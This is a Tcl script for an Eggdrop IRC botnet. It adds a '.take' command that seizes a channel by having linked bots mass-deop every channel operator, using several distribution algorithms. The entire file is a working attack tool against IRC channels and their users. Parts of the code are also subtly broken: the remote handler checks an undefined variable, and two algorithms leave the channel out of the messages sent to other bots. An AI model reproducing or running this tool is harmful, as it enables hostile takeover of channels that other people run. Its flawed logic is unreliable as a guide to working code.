edge:addcmd 1 dcc n|- "_" take dcc:takeover "Attemts takeover on a chan., use .take help for a list." ".take <type> <#chan>"

proc dcc:takeover {h i a} {
 global edge

 set type [string tolower [lindex $a 0]]
 set chan [lindex $a 1]

 if {![validchan $chan]} { set type "badchan" }

 switch -exact -- $type {
  "ind" { edge:takeover:ind $chan }
  "dist1" { edge:takeover:dist1 $chan }
  "dist2" { edge:takeover:dist2 $chan }
  "dist3" { edge:takeover:dist3 $chan }
  "default" {
  putidx $i "Usage is .takeover type chan"
  putidx $i "Type can be any of the following"
  putidx $i "iND   : All bots perform mass deop independently"
  putidx $i "DiST1 : Master makes a list of nicks for each bot, each victim is deopped once (Unsafe)"
  putidx $i "DiST2 : Master makes a list of nicks for each bot, each victim is deopped twise"
  putidx $i "DiST3 : Master makes a more or less random list of nicks for each bot to deop, each nick is deopped 3 times (by randomly bots)"
  }
 }
}

bind bot -|- "takeover" bot:remote:takeover

proc bot:remote:takeover {bot idx text} {
	set type [lindex $text 0]
	set chan [lindex $text 1]

	if {$mode == "ind"} {
		local:takeover:ind $chan
	} else {
		if {$mode == "1mode"} {
			set mode [lindex $text 2]
			set nicks [lrange $text 3 end]
			putquick "MODE $chan $mode $nicks"
		}
	}
}


#iND

proc edge:takeover:ind {chan} {
dccbroadcast "!!! $chan takeover (iND) running!!!"
 putallbots "takeover ind $chan"
 local:takeover:ind $chan
}

proc local:takeover:ind {chan} {
	set victims [getopped $chan]
	set numvictim [llength $victims]
	set todeop ""

	foreach victim $victims {
		if {$todeop == ""} { set todeop "$victim" } else { set todeop "$todeop $victim" }
		if {[llength $todeop] == 4} {
			putquick "MODE $chan -oooo $todeop"
			set todeop ""
		}
	}

	if {$todeop != ""} { putquick "MODE $chan -oooo $todeop" }

	 putlog "#Deopping $numvictim users on $chan using algoritm iND"
}

#DIST 1

proc edge:takeover:dist1  {chan} {
 set bots [getoppedbots $chan]
 set numbots [llength $bots]

 set victims [getopped $chan]
 set numvictim [llength $victims]

if {$numvictim == 0} {
 putlog "0 users to deop on $chan aborting"
 return 0
}

if {$numbots == 0} {
 putlog "0 bots to perform the command, aborting"
 return 0
}

 set perbot [expr [expr $numvictim / $numbots] + 1]
 set temp ""
 set i 0
 foreach nick $victims {
  if {$temp == ""} { set temp $nick } else { set temp "$temp $nick" }
  incr i
  if {$i == 4} {
   lappend que $temp
   set temp ""
   set i 0
  }
 }
if {$temp != ""} { lappend que $temp }
 #Now we have a nice que of 4 nicks to deop.
 set i 0
 set modes [llength $que]

 while {$i < $modes} {
  putquick "MODE $chan -oooo [lindex $que $i]"
  incr i
  foreach bot $bots {
   if {![islinked $bot]} { putlog "$bot is not linked, skipping" ; continue }
   putbot $bot "takeover 1mode $chan -oooo [lindex $que $i]"
   incr i
   if {$i > $modes} { break }
  }
 }

 putlog "#Deopping $numvictim users on $chan using $numbots and algoritm DiST1"
}

#DIST 2

proc edge:takeover:dist2  {chan} {
 set bots [getoppedbots $chan]
 set numbots [llength $bots]

 set victims [getopped $chan]
 set victims "[randomize $victims] [randomize $victims]"
 set numvictim [llength $victims]

if {$numvictim == 0} {
 putlog "0 users to deop on $chan aborting"
 return 0
}

if {$numbots == 0} {
 putlog "0 bots to perform the command, aborting"
 return 0
}

 set perbot [expr [expr $numvictim / $numbots] + 1]
 set temp ""
 set i 0
 foreach nick $victims {
  if {$temp == ""} { set temp $nick } else { set temp "$temp $nick" }
  incr i
  if {$i == 4} {
   lappend que $temp
   set temp ""
   set i 0
  }
 }
if {$temp != ""} { lappend que $temp }
 #Now we have a nice que of 4 nicks to deop.
 set i 0
 set modes [llength $que]

 while {$i < $modes} {
  putquick "MODE $chan -oooo [lindex $que $i]"
  incr i
  foreach bot $bots {
   if {![islinked $bot]} { putlog "$bot is not linked, skipping" ; continue }
   putbot $bot "takeover 1mode -oooo [lindex $que $i]"
   incr i
   if {$i > $modes} { break }
  }
 }

 putlog "#Deopping $numvictim users on $chan using $numbots and algoritm DiST2"
}


#DIST 3

proc edge:takeover:dist3  {chan} {
 set bots [getoppedbots $chan]
 set numbots [llength $bots]

 set victims [getopped $chan]
 set victims "[randomize $victims] [randomize $victims] [randomize $victims]"
 set numvictim [llength $victims]

if {$numvictim == 0} {
 putlog "0 users to deop on $chan aborting"
 return 0
}

if {$numbots == 0} {
 putlog "0 bots to perform the command, aborting"
 return 0
}

 set perbot [expr [expr $numvictim / $numbots] + 1]
 set temp ""
 set i 0
 foreach nick $victims {
  if {$temp == ""} { set temp $nick } else { set temp "$temp $nick" }
  incr i
  if {$i == 4} {
   lappend que $temp
   set temp ""
   set i 0
  }
 }
if {$temp != ""} { lappend que $temp }
 #Now we have a nice que of 4 nicks to deop.
 set i 0
 set modes [llength $que]

 while {$i < $modes} {
  set bots [randomize $bots]
  putquick "MODE $chan -oooo [lindex $que $i]"
  incr i
  foreach bot $bots {
   if {![islinked $bot]} { putlog "$bot is not linked, skipping" ; continue }
   putbot $bot "takeover 1mode -oooo [lindex $que $i]"
   incr i
   if {$i > $modes} { break }
  }
 }

 putlog "#Deopping $numvictim users on $chan using $numbots and algoritm DiST3"
}